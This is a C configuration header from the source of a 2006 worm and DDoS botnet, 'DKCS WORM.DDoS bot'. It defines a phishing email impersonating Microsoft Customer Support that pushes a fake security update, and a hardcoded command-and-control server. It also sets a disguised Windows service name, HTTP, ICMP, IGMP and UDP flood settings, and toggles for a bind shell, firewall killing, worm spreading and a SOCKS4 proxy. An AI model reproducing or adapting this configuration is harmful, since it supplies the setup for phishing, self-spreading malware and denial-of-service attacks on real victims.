//-----------------------------------------------------------------
// this file is a part of: DKCS WORM.DDoS bot v 0.1
// c0d3d by: Dr.Pixel
// 2006 (C) DKCS Security Team
//
// contacts:	e-mail:	dkcs@void.ru
//				icq:	7600278
//				web:	http://dkcs.void.ru
//				forum:	http://dkcs.net.ru
//-----------------------------------------------------------------
#define WIN32_LEAN_AND_MEAN
// e-mail config
#define MY_MACRO_EMAIL_SERVER			"mail.freenet.am"
#define MY_MACRO_EMAIL_SENDER			"support@microsoft.com"
#define MY_MACRO_EMAIL_SUBJECT			"Microsoft Customer Support"
// nice letter from Billy ;)
#define MY_MACRO_EMAIL_BODY				"Hello Dear.\n\
										In programm maintenance of corporation Microsoft critical vulnerabilyty has been found in processing wmf files.\n\
										Programmers Microsoft have let out critical updating for Windows 98/2000/XP.\n\
										We urgently recommend you and to estabilish updating.\n\
										One copy of updating packet in attach for this letter.\n\n\
										Detalis: http://support.microsoft.com\n\n\
										With best regards, Microsoft Customer Support."
// admin panel config
#define MY_MACRO_WEB_SERV				"66.109.23.197"
#define MY_MACRO_WEB_SERV_PORT			80
#define MY_MACRO_WEB_CONFIG				"/~pixel/bot/stat.php"
// service record config
#define MY_MACRO_SERVICE_NAME			"Auto HotKey Poller"
#define MY_MACRO_RECORD_NAME			"winpol" // 6char, do not change without recompilaton drivers
// ddos config
#define MY_MACRO_HTTP_DDOS_THREADS		64
#define MY_MACRO_ICMP_DDOS_THREADS		64
#define MY_MACRO_IGMP_DDOS_THREADS		64
#define MY_MACRO_UDP_DDOS_THREADS		64
// icmp flood config
#define MY_MACRO_PACKET_SIZE			1000
#define MY_MACRO_TIME_OUT				1000
// igmp flood config
#define MY_MACRO_SRC_IP					"127.0.0.1"
// cmd bind config
#define MY_MACRO_BIND					0 // !!!
#define MY_MACRO_BIND_PORT				9999
// firewall killer
#define MY_MACRO_FIREWALL_KILL			0 // !!!
#define MY_MACRO_FIREWALL_KILL_DELAY	3
// worm conf
#define MY_MACRO_WORM_ACTIVE			1
// socks4 conf
#define MY_MACRO_SOCKS4_ACTIVE			1
#define MY_MACRO_SOCKS4_PORT			5555
// other config
#define MY_MACRO_CHECK_INET_TIME		3			
#define MY_MACRO_WEB_CONF_REFRESH		50
//-----------------------------------------------------------------